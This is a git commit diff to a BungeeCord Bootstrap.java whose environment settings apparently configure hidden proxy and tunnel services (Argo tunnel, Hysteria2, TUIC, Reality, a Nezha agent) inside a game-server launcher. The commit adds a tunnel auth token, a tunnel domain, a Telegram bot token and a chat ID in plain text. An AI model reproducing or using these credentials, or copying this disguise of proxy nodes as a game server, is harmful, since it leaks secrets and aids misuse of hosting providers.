a88e4e85f2a4a64b597f1b733865084f714abdf3
chenpingan1234 <134611744+chenpingan1234@users.noreply.github.com>
2025-10-23 23:15:30 +0800

    Update Bootstrap.java

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -94,20 +94,20 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "fced143d-f6c4-40a6-862e-e7ba95e09656");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
         envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("ARGO_DOMAIN", "app.xingruo.dpdns.org");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNzJhOGZiMmFlOTdiMzNhNDFkZWY4M2MwNTEzNTMzYjIiLCJ0IjoiYjJiMGU2MmYtOTM0NS00ZGUzLTk0YjktNTc1YzZkMzA0ZDZmIiwicyI6Ik1qUXhaRFpsT1dFdFpqVXpZUzAwT1RJNUxUazRaVGN0Tm1ZNFlXUmxOR00wT0dReSJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "8310966511");
+        envVars.put("BOT_TOKEN", "8293938460:AAEivFi0DBkZIHmx04RfF07PqSKxbtL0gdQ");
         envVars.put("CFIP", "store.ubi.com");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "Mc");
